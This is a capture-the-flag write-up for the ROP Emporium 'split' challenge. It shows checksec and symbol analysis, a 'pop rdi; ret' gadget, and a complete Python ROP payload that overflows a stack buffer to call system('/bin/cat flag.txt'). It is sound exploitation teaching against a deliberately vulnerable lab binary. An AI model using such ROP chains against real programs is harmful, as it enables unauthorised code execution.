# 🔧 split – ROP Emporium Challenge

> Category: Binary Exploitation – ROP Basics  
> Difficulty: Easy  
> Arch: `amd64`  
> Objective: Craft a ROP chain to call `system("/bin/cat flag.txt")` using available gadgets.

---

## 🛠️ 1. Initial Analysis

We begin by checking the binary's security protections:

```bash
checksec split
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

### ✅ Observations:
- **NX enabled**: We cannot execute code on the stack.
- **No PIE**: All addresses are fixed.
- **No canary**: Buffer overflow is exploitable.
- **Not stripped**: We can read symbol names using `nm`.

---

## 🔍 2. Exploring Symbols

```bash
nm split
```

Relevant output:

```
0000000000400742 t usefulFunction
0000000000601060 D usefulString
```

- `usefulFunction` at `0x400742` contains a call to `system()`.
- `usefulString` at `0x601060` contains the string `"/bin/cat flag.txt"`.

Our goal: **call `system("/bin/cat flag.txt")`**.

---

## 🧱 3. Finding Gadgets

Using `ROPgadget` to find a gadget that lets us control the first argument (`rdi`) of `system()`:

```bash
ROPgadget --binary split | grep 'pop rdi'
```

Found:

```
0x00000000004007c3 : pop rdi ; ret
```

This gadget allows us to place a value (e.g., a string address) into `rdi`, which is the first argument to functions in the x86_64 calling convention.

---

## 🧪 4. Building the Exploit

We construct a payload to:

1. Overflow the buffer
2. Set `rdi = 0x601060` (address of `"/bin/cat flag.txt"`)
3. Call `system()` (via `usefulFunction`)

### Final Payload:

```python
payload  = b"A" * 40               # Overflow buffer (32 bytes) + saved RBP (8 bytes)
payload += p64(0x4007c3)           # pop rdi ; ret
payload += p64(0x601060)           # address of "/bin/cat flag.txt"
payload += p64(0x40074b)           # address of system() in usefulFunction
```

---

## 🎯 5. Result

Running the exploit successfully prints the flag:

```
ROPE{split_placeholder_32byte_flag!}
```

---

## 🧠 Key Takeaways

- Use `ROPgadget` to find useful gadgets like `pop rdi ; ret`.
- Understand the System V AMD64 calling convention.
- Symbols like `system()` and command strings often exist in challenges — look for them.